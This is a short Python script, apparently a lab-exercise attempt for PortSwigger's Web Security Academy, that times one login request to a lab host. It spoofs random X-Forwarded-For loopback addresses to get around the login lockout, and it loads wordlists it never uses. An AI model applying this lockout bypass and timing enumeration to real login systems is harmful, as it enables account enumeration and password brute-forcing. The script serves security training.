# Username enumeration via response timing
import requests
import time
import random

url = "https://0adf00b4031d4cdfc0ff73da00e900c5.web-security-academy.net/login"
fd = open("/home/tester13/Documents/CTF/Portswigger/Authentication/user.txt","r")
user_id = fd.read()
fd.close()
fd = open("/home/tester13/Documents/CTF/Portswigger/Authentication/pass.txt","r")
passwd=fd.read()
fd.close()

# Redirecting to local host request. To eradicate: [You have made too many incorrect login attempts. Please try again in 30 minute(s) Message]
header={
    "X-Forwarded-For":"127.{}.{}.{}".format(random.randint(0, 256),random.randint(0, 256),random.randint(0, 256))
}
data={
    "username":"wiener",
    "password":"peter"
}


t1=time.perf_counter()
r = requests.post(url,data=data,headers=header)
t2=time.perf_counter()
print("Response Time:{}".format(t2-t1))


